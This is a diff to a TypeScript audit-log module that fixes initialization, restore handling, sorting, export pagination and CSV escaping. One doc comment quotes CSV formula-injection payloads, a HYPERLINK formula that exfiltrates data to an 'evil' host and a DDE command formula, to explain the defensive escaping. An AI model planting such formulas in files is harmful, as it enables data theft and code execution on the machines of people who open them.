@@ -15,6 +15,7 @@
  */
 
 import { readStoreValue, writeStoreValueChecked } from "../amosStore";
+import { currentAppVersion, resolveAuditIdentity } from "../buildIdentity";
 import { logger } from "./logger";
 import { mdmManager } from "./mdm";
 import { localId } from "../localId";
@@ -280,6 +281,127 @@ const LOG_LEVEL_PRIORITY: Record<AuditLogLevel, number> = {
   critical: 4,
 };
 
+/**
+ * Result ordinals — ascending severity, the **same convention** `LOG_LEVEL_PRIORITY`
+ * states for the sibling `sortBy: "level"` dimension (REQ-A1542 ∕ F-SH-782).
+ *
+ * `sortBy` declares three dimensions; the comparator branched on only two. With
+ * `"result"` every pair compared `0`, so `sort` returned the input order and the
+ * caller's requested order was **silently discarded** — a query that claims to be
+ * sorted by outcome and isn't is the same class of lie as a `0` standing in for a
+ * value nobody read. Success is benign (0) and blocked is the most severe (3); the
+ * order is a policy this module states, not one inferred from the data.
+ */
+const RESULT_PRIORITY: Record<AuditResult, number> = {
+  success: 0,
+  warning: 1,
+  failure: 2,
+  blocked: 3,
+};
+
+/**
+ * Narrow a value read from {@link AUDIT_LOGS_KEY} to a list of log rows.
+ *
+ * This key is a **`SYNC_STORES` member**, and `restoreStores` writes a backup's
+ * value for it back **verbatim, with no shape check** — so a restore can legally
+ * put anything here. That collides with this key's on-disk format: `saveLogs`
+ * stringifies (and `writeStoreValueChecked` stringifies again), so the store holds
+ * a *double-encoded* array and `readStoreValue` hands back the inner JSON **string**.
+ * `loadLogs` then applied a **second** `JSON.parse` to whatever it got, which only
+ * works for that one shape. Two ways it broke, both reachable from a restore:
+ *
+ *  * a blob carrying the rows as a real array → `JSON.parse(["…"])` stringifies its
+ *    argument (`"[object Object]"`) and throws → the restored logs were silently
+ *    dropped: 「恢复成功」, and the audit history was empty.
+ *  * a blob carrying the key as a JSON *string* that is not an array (`"{}"`, `"5"`)
+ *    → `this.logs` became that non-array, and `bootstrap()`'s
+ *    `cleanupExpiredLogs` (`this.logs.filter`) threw. `AuditLogViewer` calls
+ *    `getStatistics` in a `$derived` that runs on render, so the viewer could not
+ *    open at all.
+ *
+ * Accept **both** forms (the string this class writes, and an already-decoded
+ * array a restore delivers) and fall back to "no logs" for anything else. A
+ * non-terminal junk row is dropped for the same reason: every reader assumes rows.
+ * Nothing is written back — this is a read-side narrowing, never a repair.
+ */
+function normalizeAuditLogs(raw: unknown): AuditLog[] {
+  let v: unknown = raw;
+  if (typeof v === "string") {
+    try {
+      v = JSON.parse(v);
+    } catch {
+      return [];
+    }
+  }
+  if (!Array.isArray(v)) return [];
+  return v.filter((r): r is AuditLog => typeof r === "object" && r !== null);
+}
+
+/**
+ * Render one CSV cell. **Two independent rules, in this order.**
+ *
+ * 1. **Formula injection** (OWASP "CSV Injection"). Excel, LibreOffice and Sheets evaluate a
+ *    cell whose **first** character is `=` `+` `-` `@` — a leading tab or CR does the same —
+ *    so a free-text field becomes a live formula the moment the exported file is opened:
+ *    `=HYPERLINK("http://evil/?"&A1,"x")` lifts the row out, and the classic
+ *    `=cmd|'/C calc'!A0` (DDE) runs a program. RFC 4180 quoting does **not** stop this — the
+ *    spreadsheet strips the quotes and evaluates the field — so the only honest defusal is a
+ *    leading `'`, which every spreadsheet reads as "the rest is text" and hides.
+ *
+ *    This is reachable, not theoretical. `resourceName` is the **raw** shortcut name
+ *    (`validateShortcutName` checks only non-empty ∕ length) and `errorMessage` is an
+ *    arbitrary error string; neither carries a prefix. `eventDescription` happens to start
+ *    with 「执行快捷指令: 」, which is exactly why the *resource* column, not the description,
+ *    is the live vector — a name that a bare `eventDescription` check would have cleared.
+ *
+ * 2. **RFC 4180 §2**: a field carrying the delimiter, a double quote or a line break is
+ *    wrapped in quotes with its inner quotes doubled; anything else stays bare.
+ *
+ * `exportLogs`' CSV branch used to `row.join(",")` every field as-is. But `eventDescription`
+ * is **free text** — `logExecution` writes `执行快捷指令: ${shortcutName}` — and
+ * `errorMessage` is an arbitrary error string, so:
+ *
+ *  * a comma in a shortcut's name added a column, shifting every field after it onto its
+ *    neighbour — the exported record credited one row's `success` to another row's result;
+ *  * a newline split one record into two lines (and a reader counting lines saw extra rows);
+ *  * a double quote truncated the text at the quote.
+ *
+ * The JSON branch beside it (`JSON.stringify(logs, null, 2)`) was always intact — same
+ * method, same export menu — which is what marked the CSV path as the odd one out rather
+ * than a format nobody depends on. This is the one rule; headers and cells both go through it.
+ *
+ * Honest boundary: for a cell that *does* start with a trigger character the exported bytes
+ * differ from the stored value by that leading `'`. A spreadsheet renders the original text;
+ * a reader that does not understand the convention will show the apostrophe. There is no
+ * lossless alternative for a CSV a spreadsheet will evaluate — the choice is between an
+ * altered cell and an executable one.
+ */
+function csvField(value: unknown): string {
+  const s = value == null ? "" : String(value);
+  const guarded = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
+}
+
+/**
+ * Render a row's timestamp as an ISO-8601 cell, or `""` when it is not a usable date.
+ *
+ * A row is only as good as the store it came from, and this key is a `SYNC_STORES` member:
+ * `restoreStores` writes a backup's value back verbatim, and `normalizeAuditLogs` (the
+ * reader's narrowing) admits any object row by design — it does **not** require a timestamp.
+ * So a legal restore can put a row in front of the exporter whose `timestamp` is missing,
+ * a string, `NaN`, or out of the Date range. `new Date(log.timestamp).toISOString()` threw
+ * `RangeError: Invalid time value` on every one of those and took the **whole export** with
+ * it — a failed CSV file nobody could explain. The sibling branches never throw: the JSON
+ * branch stringifies the row as-is, and the viewer's own `formatTimestamp` draws the empty
+ * date rather than claiming one. This cell must agree with them: no date is `""` (「没有
+ * 记录到时刻」), never a fabricated epoch.
+ */
+function csvTimestamp(value: unknown): string {
+  if (typeof value !== "number" || !Number.isFinite(value)) return "";
+  const d = new Date(value);
+  return Number.isNaN(d.getTime()) ? "" : d.toISOString();
+}
+
 // ============================================================================
 // 审计日志管理器
 // ============================================================================
@@ -291,27 +413,74 @@ export class AuditLogger {
   private syncQueue: string[] = [];
   private flushTimer: ReturnType<typeof setInterval> | null = null;
   private syncTimer: ReturnType<typeof setInterval> | null = null;
+  /** `ensureInitialized()` 是否已经跑过（见那里为什么读写路径要自己把它叫起来）。 */
+  private initialized = false;
+  /** 是否有人**显式**选过配置（`updateConfig`）。见 `loadConfig()` 的第一条判据。 */
+  private configChosen = false;
 
   /**
-   * 初始化审计日志系统
+   * 引导流水线，**幂等**，而且由使用者自己触发（REQ-A897）。
+   *
+   * 为什么不能只依赖 `initialize()`：它只被 `enterprise/index.ts` 的
+   * `initializeEnterprise()` 调用，而后者在生产里**零调用者** —— 于是这一整套
+   * 「读配置 / 读回已落盘的日志 / 起刷新定时器」从来没有在设备上发生过：
+   * 上一次会话写进存储的审计日志，重启后没有任何人读回来；而把缓冲区搬进
+   * `logs` 的唯一**定时**路径（`startFlushTimer`）也从未启动。
+   *
+   * 所以把「我准备好了」这句话系在**真正需要它的那两个动作**上：写一条
+   * （`log()`）和读一次（`query()` / `getStatistics()`）。任何一条被用到，
+   * 流水线就先自己站起来。`initialized` 在**任何 await / 重入之前**置位 ——
+   * `initialize()` 自己会调 `log()`，没有这个顺序就是无限递归。
    */
-  async initialize(): Promise<void> {
+  private ensureInitialized(): void {
+    if (this.initialized) return;
+    this.initialized = true;
+    this.bootstrap();
+    // **没有**在这里补一条「本会话起点」。这件事是本轮刻意留下的（REQ-A982 / F-SH-309 的
+    // 边界段）：`system_start` / `system_stop` 这对标记仍然只有 `initialize()` / `shutdown()`
+    // 会写，而这两条路径在生产里都没有调用者。补法有两条，都不是在这里悄悄加一行：
+    // ①挂在一个真实的启动钩子上（本仓当前没有这样的钩子，`initializeEnterprise()` 就是那个
+    // 不存在的钩子的替身）；②在这里惰性发一条 —— 那会让「系统启动」这句话出现在**用户第一次
+    // 打开审计查看器**的时刻，一条 Audit 轨里的假启动时刻比没有起点更坏。
+  }
+
+  /**
+   * 「装载 + 保留期 + 起定时器」这一份，只有这一处（`initialize()` 与 `ensureInitialized()`
+   * 共用；两份字节相同的引导正是 REQ-A897 在修的形状）。
+   */
+  private bootstrap(): void {
     this.loadConfig();
     this.loadLogs();
     this.loadSyncQueue();
-    
+    // 保留期在**这里**生效，不再在 `initialize()` 里（REQ-A982 / F-SH-309）：`initialize()`
+    // 的唯一调用者 `initializeEnterprise()` 在生产里零调用者，于是 `retentionDays` 是一个
+    // **存了、也配了、却从来没人执行**的上限 —— 审计行只增不减地留在存储里。
+    this.cleanupExpiredLogs();
     if (this.config.enabled) {
-      // 启动定时刷新
       this.startFlushTimer();
-      
-      // 启动自动同步
       if (this.config.syncEnabled && mdmManager.isEnabled()) {
         this.startSyncTimer();
       }
-      
-      // 清理过期日志
-      await this.cleanupExpiredLogs();
-      
+    }
+  }
+
+  /**
+   * 初始化审计日志系统
+   *
+   * 语义与从前一致（每次都重新装载、每次都记 `system_start`），只是**定时器不再叠加**
+   * —— 从前重复调用会把上一只 `setInterval` 的句柄覆盖掉，那只定时器再也没人能停
+   * （REQ-A385 的形状），所以在 `startFlushTimer()` 里先清旧的。
+   */
+  async initialize(): Promise<void> {
+    // 显式初始化 = 「采纳存储里那一份」，与从前一致（也是测试隔离依赖的语义）。
+    this.configChosen = false;
+    this.bootstrap();
+    this.initialized = true;
+
+    if (this.config.enabled) {
+      // 保留期不在这里单独跑了：它在 `bootstrap()` 里，`initialize()` 与
+      // `ensureInitialized()` 共用那一份（REQ-A982 / F-SH-309）。
+
       // 记录系统启动
       await this.log({
         eventType: "system_start",
@@ -343,6 +512,9 @@ export class AuditLogger {
     tags?: string[];
     custom?: Record<string, unknown>;
   }): Promise<string> {
+    // 写之前先把流水线叫起来：`config` 必须是**读过存储的那一份**，否则 `enabled`
+    // 与 `minLevel` 判的都是编译期默认值，而存储里那份配置从未生效（REQ-A897）。
+    this.ensureInitialized();
     if (!this.config.enabled) {
       return "";
     }
@@ -391,7 +563,10 @@ export class AuditLogger {
 
     // 如果缓冲区满了，立即刷新
     if (this.buffer.length >= this.config.bufferSize) {
-      await this.flush();
+      // 落到**公开那一个** `flushBuffer()`（REQ-A897）：原来这里调的是私有 `flush()`，
+      // 于是「测试钉住的那份实现」和「生产跑的那份实现」是两份字节相同的代码 ——
+      // 改一份不会让另一份红。现在只有一份，测试碰到的就是生产跑的。
+      await this.flushBuffer();
     }
 
     return log.id;
@@ -427,10 +602,31 @@ export class AuditLogger {
   }
 
   /**
-   * 查询审计日志
+   * 一条审计日志**写下来之后就该能被读到**（REQ-A897）：`logs` 与 `buffer` 的并集。
+   *
+   * 缓冲区是**为落盘的批量**而存在的，不是为了对读者隐藏。原来的读者只看 `this.logs`，
+   * 而搬动 buffer→logs 的只有两条路：缓冲区满（默认 1000 条），和只在 `initialize()`
+   * 里启动的刷新定时器 —— 后者在生产里从没启动过。于是审计查看器（`AuditLogViewer`
+   * 是挂载着的界面）在正常情况下**一行都看不到**，直到攒满 1000 条才整批跳出来；
+   * 而 `flushBuffer()` 这个公开的刷新口，生产里零调用者，只有测试在调它 ——
+   * 测试自己补上了生产从不做的那一步，所以测试一直是绿的。
+   *
+   * 并集不会重复计数：`flushBuffer()` 是**移动**（push 之后清空 buffer），不是拷贝。
    */
-  query(params: AuditLogQuery = {}): AuditLog[] {
-    let results = [...this.logs];
+  private allLogs(): AuditLog[] {
+    return this.buffer.length === 0 ? this.logs : [...this.logs, ...this.buffer];
+  }
+
+  /**
+   * Apply every filter dimension of an {@link AuditLogQuery} — **the one rule** the reader
+   * (`query`), the exporter (`exportLogs`) and the statistics (`getStatistics`) all share.
+   *
+   * No sort and no pagination here: those belong to the reader. Statistics must aggregate the
+   * *whole* matching set while the reader caps what it draws, so the two cannot be the same call
+   * — but they must agree on **what matched**.
+   */
+  private filterLogs(params: AuditLogQuery): AuditLog[] {
+    let results = [...this.allLogs()];
 
     // 时间过滤
     if (params.startTime) {
@@ -495,6 +691,20 @@ export class AuditLogger {
       );
     }
 
+    return results;
+  }
+
+  /**
+   * 排序后的**整个匹配集** —— 分页之前的那一份（REQ-A1514 ∕ F-SH-759）。
+   *
+   * `query()` 在它之上切一页（默认 100 条），`exportLogs()` 要的却是整份：导出的是一张审计
+   * 凭据，**静默地只写第一页等于丢数据**。修前 `exportLogs` 的第一行逐字是
+   * `const logs = this.query(query);`，于是导出和读者一样吃那条默认上限 —— 屏幕上的
+   * 「总计 N」数的是整个匹配集，写出去的文件却只到 100 条，谁也没说。
+   */
+  private matchedSorted(params: AuditLogQuery): AuditLog[] {
+    const results = this.filterLogs(params);
+
     // 排序
     const sortBy = params.sortBy || "timestamp";
     const sortOrder = params.sortOrder || "desc";
@@ -504,9 +714,21 @@ export class AuditLogger {
         comparison = a.timestamp - b.timestamp;
       } else if (sortBy === "level") {
         comparison = LOG_LEVEL_PRIORITY[a.level] - LOG_LEVEL_PRIORITY[b.level];
+      } else if (sortBy === "result") {
+        comparison = RESULT_PRIORITY[a.result] - RESULT_PRIORITY[b.result];
       }
       return sortOrder === "asc" ? comparison : -comparison;
     });
+
+    return results;
+  }
+
+  /**
+   * 查询审计日志 —— 匹配集之上切**一页**（默认 100 条）。调用方要整份时传 `limit`。
+   */
+  query(params: AuditLogQuery = {}): AuditLog[] {
+    this.ensureInitialized();
+    const results = this.matchedSorted(params);
 
     // 分页
     const offset = params.offset || 0;
@@ -515,18 +737,18 @@ export class AuditLogger {
   }
 
   /**
-   * 获取统计信息
+   * 获取统计信息 — **按查看器正在显示的那份查询**（REQ-A1495 ∕ F-SH-736）。
+   *
+   * 修前它只收时间窗（`getStatistics(startTime?, endTime?)`），于是统计卡统计的是另一个集合：
+   * 界面把「结果」筛成「失败」之后，列表只剩失败行，而正上方的统计卡照旧印着这个时间窗里的
+   * **成功**条数 —— 列表刚刚剔除掉的那些行 —— 列表标题却在数失败。同一个屏幕两个数。
+   *
+   * 查看器那份 `query` 的三个消费者里，列表（`query`）与导出（`exportLogs`）都传整个对象，
+   * 只有统计传了两个数字 —— 这就是那条被漏掉的规则。现在三者走同一条 {@link filterLogs}。
    */
-  getStatistics(startTime?: number, endTime?: number): AuditStatistics {
-    let logs = this.logs;
-
-    // 时间过滤
-    if (startTime) {
-      logs = logs.filter(log => log.timestamp >= startTime);
-    }
-    if (endTime) {
-      logs = logs.filter(log => log.timestamp <= endTime);
-    }
+  getStatistics(params: AuditLogQuery = {}): AuditStatistics {
+    this.ensureInitialized();
+    const logs = this.filterLogs(params);
 
     const stats: AuditStatistics = {
       totalLogs: logs.length,
@@ -563,13 +785,17 @@ export class AuditLogger {
   }
 
   /**
-   * 导出日志
+   * 导出日志 — **整个匹配集**，不分页（REQ-A1514 ∕ F-SH-759）。
+   *
+   * 修前走的是 `this.query(query)`，于是导出和列表一样只到默认的 100 条：一份审计凭据
+   * 静默地少了第 101 条之后的全部行。筛选条件仍然照旧生效 —— 少的只是那条谁都没看见的上限。
    */
   async exportLogs(
     query: AuditLogQuery = {},
     format: "json" | "csv" = "json"
   ): Promise<string> {
-    const logs = this.query(query);
+    this.ensureInitialized();
+    const logs = this.matchedSorted(query);
 
     if (format === "json") {
       return JSON.stringify(logs, null, 2);
@@ -589,7 +815,7 @@ export class AuditLogger {
     ];
 
     const rows = logs.map(log => [
-      new Date(log.timestamp).toISOString(),
+      csvTimestamp(log.timestamp),
       log.level,
       log.userName,
       log.eventType,
@@ -600,44 +826,30 @@ export class AuditLogger {
       log.duration?.toString() || "",
     ]);
 
-    const csv = [headers, ...rows].map(row => row.join(",")).join("\n");
+    // Every cell — header included — goes through the one quoting rule (RFC 4180). A bare
+    // `row.join(",")` let a comma inside a description shift the columns after it.
+    const csv = [headers, ...rows]
+      .map((row) => row.map(csvField).join(","))
+      .join("\n");
     return csv;
   }
 
   /**
-   * 刷新缓冲区
+   * 刷新缓冲区：把 `buffer` **移动**进 `logs`（并进同步队列、落盘）。
+   *
+   * 这是唯一一份刷新实现（REQ-A897）。原来它旁边还有一份字节相同的私有 `flush()`
+   * —— 生产的三条路径（写满、定时器、关闭）调的都是**私有那份**，而公开这份只有
+   * 测试在调；两份实现意味着「测试钉住的」和「设备上跑的」可以各自漂移。
    */
   async flushBuffer(): Promise<void> {
     if (this.buffer.length === 0) return;
 
     // 移动到主日志数组
     this.logs.push(...this.buffer);
-    
+
     // 添加到同步队列
     this.syncQueue.push(...this.buffer.map(log => log.id));
-    
-    // 清空缓冲区
-    this.buffer = [];
 
-    // 保存（即使失败也不影响内存中的日志）
-    this.saveLogs();
-    this.saveSyncQueue();
-  }
-  
-  /**
-   * 刷新缓冲区（私有方法，保持向后兼容）
-   * @deprecated 使用 flushBuffer() 代替
-   */
-  private async flush(): Promise<void> {
-    // 直接实现刷新逻辑，避免递归
-    if (this.buffer.length === 0) return;
-
-    // 移动到主日志数组
-    this.logs.push(...this.buffer);
-    
-    // 添加到同步队列
-    this.syncQueue.push(...this.buffer.map(log => log.id));
-    
     // 清空缓冲区
     this.buffer = [];
 
@@ -691,19 +903,23 @@ export class AuditLogger {
   }
 
   /**
-   * 清理过期日志
+   * 清理过期日志。
+   *
+   * **同步的**（体内一个 `await` 也没有），因为它现在挂在同步的 `bootstrap()` 上，而生产入口
+   * `query()` / `getStatistics()` 都是同步的 —— 从前的 `async` 签名正是它只能被 `initialize()`
+   * 叫到的原因之一（REQ-A982 / F-SH-309）。
+   *
+   * 只删**已同步**的过期行：一条还没上云的审计条目被本地删掉就是永久丢失，这是本模块一贯的
+   * 方向（宁可留着，不可丢）。代价写进 F-SH-309 的边界段：一台没有 MDM 服务器的设备，保留期
+   * 仍然管不住这份存储 —— 那条策略本轮**不**动。
    */
-  private async cleanupExpiredLogs(): Promise<void> {
+  private cleanupExpiredLogs(): void {
     const cutoffTime = Date.now() - this.config.retentionDays * 24 * 60 * 60 * 1000;
-    
-    // 只删除已同步的过期日志
-    this.logs = this.logs.filter(log => {
-      if (log.timestamp < cutoffTime && log.synced) {
-        return false;
-      }
-      return true;
-    });
-
+    const kept = this.logs.filter((log) => !(log.timestamp < cutoffTime && log.synced));
+    // 一行都没删就不重写存储：引导每次启动都跑，一次空写既是多余的 I/O，也会在配额紧张时
+    // 把别的键挤出去（`writeStoreValueChecked` 的失败正是别的键先被牺牲的那种）。
+    if (kept.length === this.logs.length) return;
+    this.logs = kept;
     this.saveLogs();
   }
 
@@ -715,8 +931,11 @@ export class AuditLogger {
       logger.warn("audit", "setInterval not available, skipping flush timer");
       return;
     }
+    // 先清旧的：重复 bootstrap/initialize 时旧句柄会被覆盖，那只定时器就再也没人
+    // 能停掉了（REQ-A385 的 lifetime 判据）。
+    if (this.flushTimer) globalThis.clearInterval(this.flushTimer);
     this.flushTimer = globalThis.setInterval(() => {
-      this.flush().catch(err => {
+      this.flushBuffer().catch(err => {
         console.error("[Audit] 刷新失败:", err);
       });
     }, this.config.flushInterval * 1000);
@@ -730,6 +949,7 @@ export class AuditLogger {
       logger.warn("audit", "setInterval not available, skipping sync timer");
       return;
     }
+    if (this.syncTimer) globalThis.clearInterval(this.syncTimer);
     this.syncTimer = globalThis.setInterval(() => {
       this.syncToServer().catch(err => {
         console.error("[Audit] 同步失败:", err);
@@ -751,7 +971,7 @@ export class AuditLogger {
     }
 
     // 最后刷新一次
-    await this.flush();
+    await this.flushBuffer();
 
     // 记录系统停止
     await this.log({
@@ -859,48 +1079,31 @@ export class AuditLogger {
    * 获取当前用户 ID
    */
   private getCurrentUserId(): string {
-    try {
-      const userId = readStoreValue("amos.user.id", "");
-      return userId || "user-default";
-    } catch {
-      return "user-default";
-    }
+    // 没有登录：缺席的身份如实标记为 `unattributed`，绝不编造一个"用户"（REQ-A695）。
+    return resolveAuditIdentity().userId;
   }
 
   /**
    * 获取当前用户名
    */
   private getCurrentUserName(): string {
-    try {
-      const userName = readStoreValue("amos.user.name", "");
-      return userName || "Default User";
-    } catch {
-      return "Default User";
-    }
+    return resolveAuditIdentity().userName;
   }
 
   /**
    * 获取当前用户邮箱
    */
   private getCurrentUserEmail(): string | undefined {
-    try {
-      const userEmail = readStoreValue("amos.user.email", "");
-      return userEmail || undefined;
-    } catch {
-      return undefined;
-    }
+    return resolveAuditIdentity().userEmail;
   }
 
   /**
    * 获取应用版本
    */
   private getAppVersion(): string {
-    try {
-      const version = readStoreValue("amos.app.version", "");
-      return version || "0.1.0";
-    } catch {
-      return "0.1.0";
-    }
+    // 唯一真源 `AMOS_UI_VERSION`（由 version.test.ts 钉在 package.json 上）：审计记录不再持有
+    // 第二份会腐烂的版本字面量（REQ-A695）。
+    return currentAppVersion();
   }
 
   /**
@@ -923,6 +1126,12 @@ export class AuditLogger {
    * 加载配置
    */
   private loadConfig(): void {
+    // 有人**显式**选过配置（`updateConfig`）时，存储不能把它改回去（REQ-A897）。
+    // 这一条是自启动带来的新时序所必需的：从前装载只在 `initialize()` 那个明确
+    // 时刻发生，现在第一次 `log()`/`query()` 也会触发它 —— 若此时无条件覆盖，
+    // 一个「先配置、后使用」的调用者会发现自己的选择被存储里那份悄悄顶掉。
+    if (this.configChosen) return;
+
     const raw = readStoreValue(STORE_KEYS.AUDIT_CONFIG, "");
     if (!raw) {
       this.config = DEFAULT_CONFIG;
@@ -953,21 +1162,10 @@ export class AuditLogger {
   }
 
   /**
-   * 加载日志
+   * 加载日志 — 解码出的值交给 {@link normalizeAuditLogs} 收口（REQ-A1511 ∕ F-SH-756）。
    */
   private loadLogs(): void {
-    const raw = readStoreValue(STORE_KEYS.AUDIT_LOGS, "");
-    if (!raw) {
-      this.logs = [];
-      return;
-    }
-
-    try {
-      this.logs = JSON.parse(raw) as AuditLog[];
-    } catch (err) {
-      console.error("[Audit] 加载日志失败:", err);
-      this.logs = [];
-    }
+    this.logs = normalizeAuditLogs(readStoreValue<unknown>(STORE_KEYS.AUDIT_LOGS, ""));
   }
 
   /**
@@ -1024,6 +1222,7 @@ export class AuditLogger {
    */
   updateConfig(updates: Partial<AuditConfig>): void {
     this.config = { ...this.config, ...updates };
+    this.configChosen = true; // 显式选择：存储不再有权把它顶掉
     this.saveConfig();
 
     // 重启定时器
